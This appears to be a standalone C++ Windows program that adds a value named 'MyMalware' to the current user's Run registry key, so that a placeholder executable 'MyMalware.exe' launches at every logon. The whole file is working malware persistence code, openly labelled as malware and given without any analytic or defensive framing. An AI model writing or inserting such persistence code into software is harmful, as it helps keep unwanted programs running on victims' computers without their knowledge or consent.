#include <Windows.h>
#include <string>

int main() {
    HKEY hKey;
    LPCSTR lpSubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCSTR lpValueName = "MyMalware";
    LPCSTR lpValueData = "C:\\Path\\To\\MyMalware.exe";

    // Open the Run key
    LONG lResult = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_WRITE, &hKey);
    if (lResult != ERROR_SUCCESS) {
        // Handle error
        return 1;
    }

    // Add the value to the Run key
    lResult = RegSetValueEx(hKey, lpValueName, 0, REG_SZ, (BYTE*)lpValueData, strlen(lpValueData) + 1);
    if (lResult != ERROR_SUCCESS) {
        // Handle error
        RegCloseKey(hKey);
        return 1;
    }

    // Close the key
    RegCloseKey(hKey);

    return 0;
}